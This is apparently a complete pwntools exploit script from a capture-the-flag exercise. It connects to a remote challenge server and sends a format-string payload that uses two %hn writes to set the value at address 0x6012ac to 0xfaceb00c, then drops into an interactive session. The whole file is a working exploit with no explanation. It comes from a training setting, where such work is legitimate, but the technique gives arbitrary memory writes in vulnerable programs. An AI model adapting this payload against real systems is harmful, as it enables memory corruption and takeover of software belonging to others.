from pwn import *

r = remote("csie.ctf.tw", 10129)
# r = process("./fmt1")

a = 0x6012ac

#faceb00c
payload = "%45068c%22$hn%19138c%23$hn".ljust(0x30, '\x00') + p64(a) + p64(a+2)
r.recv()
r.sendline(payload)


r.interactive()
